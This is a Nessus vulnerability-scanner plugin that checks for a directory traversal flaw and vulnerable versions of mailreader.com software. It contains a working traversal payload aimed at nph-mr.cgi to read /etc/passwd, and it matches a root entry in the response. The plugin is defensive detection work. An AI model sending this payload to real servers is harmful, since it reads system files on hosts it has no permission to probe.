# (C) Michel Arboi <arboi@alussinan.org> 2003
#
# GPL
#
# References:
# Date: Mon, 28 Oct 2002 17:48:04 +0800
# From: "pokleyzz" <pokleyzz@scan-associates.net>
# To: "bugtraq" <bugtraq@securityfocus.com>, 
#  "Shaharil Abdul Malek" <shaharil@scan-associates.net>, 
#  "sk" <sk@scan-associates.net>, "pokley" <saleh@scan-associates.net>, 
#  "Md Nazri Ahmad" <nazri@ns1.scan-associates.net> 
# Subject: SCAN Associates Advisory : Multiple vurnerabilities on mailreader.com
#

if(description)
{
  script_id(11780);
  script_cve_id("CVE-2002-1581", "CVE-2002-1582");
  script_bugtraq_id(5393, 6055, 6058);
  script_version("$Revision: 1.10 $");

  name["english"] = "mailreader.com directory traversal and arbitrary command execution";
  script_name(english:name["english"]);

  desc["english"] = "
mailreader.com software is installed. A directory traversal flaw 
allows anybody to read arbitrary files on your system.

Solution: upgrade to v2.3.32 or later

Risk factor : High";

  script_description(english:desc["english"]);

  summary["english"]="Checks directory traversal & version number of mailreader.com software";
  script_summary(english:summary["english"]);

  script_category(ACT_ATTACK);
  script_copyright(english: "(C) Michel Arboi 2003");

  family["english"]="CGI abuses";
  family["francais"]="Abus de CGI";
  script_family(english:family["english"], francais:family["francais"]);
 
  script_dependencie("find_service.nes", "no404.nasl", "webmirror.nasl");
  script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);


if(! get_port_state(port)) exit(0);

dirtrav = 1; version = 1;

foreach dir (make_list(cgi_dirs()))
{
  r2 = NULL;
  if (dirtrav)
  {
    r = http_get(port: port, item: strcat(dir, "/nph-mr.cgi?do=loginhelp&configLanguage=../../../../../../../etc/passwd%00"));
    r2 =  http_keepalive_send_recv(port: port, data: r);
    if (isnull(r2)) exit(0);	# Dead server
    if (r2 =~ "root:[^:]*:0:[01]:")
    {
      security_hole(port);
      dirtrav = 0;
    }
  }

  if (version)
  {
    if (r2 !~ "Powered by Mailreader.com v[0-9.]*")
    {
      r = http_get(port: port, item: strcat(dir,  "/nph-mr.cgi?do=loginhelp&configLanguage=english"));
      r2 =  http_keepalive_send_recv(port: port, data: r);
    }
    if (r2 =~ "Powered by Mailreader.com v2\.3\.3[01]")
    {
      m = "You are running a version of mailreader.com software 
which allows any authenticated user to run arbitrary commands
on your system.

*** Note that Nessus just checked the version number and did not
*** perform a real attack. So this might be a false alarm.

Solution: upgrade to v2.3.32 or later

Risk factor : High";
      security_hole(port: port, data: m);
      version = 0;
    }
    else if (r2 =~ "Powered by Mailreader.com v2\.([0-1]\.*|2\.([0-2]\..*|3\.([0-9][^0-9]|[12][0-9])))")
    {
# Note: SecurityFocus #5393 advises you to upgrade to 2.3.30, but
# this version contains a terrible flaw! (read above)
      m = "You are running an old version of mailreader.com software 
which allows an attacker to hijack user session.

*** Note that Nessus just checked the version number and did not
*** perform a real attack. So this might be a false alarm.

Solution: upgrade to v2.3.32 or later

Risk factor : Low";
      security_warning(port: port, data: m);
      version = 0;
    }
  }
  if (! version && ! dirtrav) exit(0);
}

